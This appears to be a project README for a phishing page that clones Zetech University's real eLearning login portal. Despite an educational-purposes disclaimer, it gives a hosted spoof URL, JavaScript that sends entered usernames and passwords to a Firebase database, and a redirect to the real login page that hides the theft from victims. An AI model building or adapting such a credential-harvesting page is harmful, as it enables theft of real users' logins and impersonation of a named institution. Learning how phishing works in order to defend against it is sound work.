# 🎣 Zetech eLearning Phishing Simulation (EDUCATIONAL PURPOSES ONLY)

> **⚠️ DISCLAIMER:** This project was created strictly for educational purposes as part of my cybersecurity learning. It should **never** be used against real users, systems, or without explicit written permission from the owners of the targeted platforms. Misuse of this tool can lead to serious legal consequences.

## 📚 Project Summary

This repository contains a simulated phishing page that mimics Zetech University's eLearning login portal. The purpose of this project was to understand how phishing attacks are designed and executed, as well as how user credentials can be harvested in real-time using modern technologies such as **Firebase Realtime Database**.

---

## 🎯 Objectives

- Clone a real-world login page (Zetech eLearning).
- Integrate the form with Firebase to collect credentials in real-time.
- Redirect the user to the actual login page after submission.
- Demonstrate how social engineering and spoofing tactics work in real-world scenarios.

---

## ⚙️ Technologies Used

- HTML/CSS (Exact clone of the real login page)
- Firebase Realtime Database
- JavaScript
- Bootstrap (for UI)
- Social Engineering techniques

---

## 🔐 Firebase Integration

Firebase was used to store phished credentials in real-time. Here's how it works:

1. The user enters their credentials on the spoofed page.
 ```https://elearning-zetech-ac.netlify.app```
2. JavaScript captures the input and writes it to the Firebase database:
    ```js
    firebase.database().ref('phishing_data').push({
        username: username,
        password: password,
        timestamp: new Date().toISOString()
    });
    ```
3. The user is then redirected to the **real** Zetech eLearning login page:
    ```js
    window.location.href = 'https://elearning.zetech.ac.ke/login/index.php';
    ```




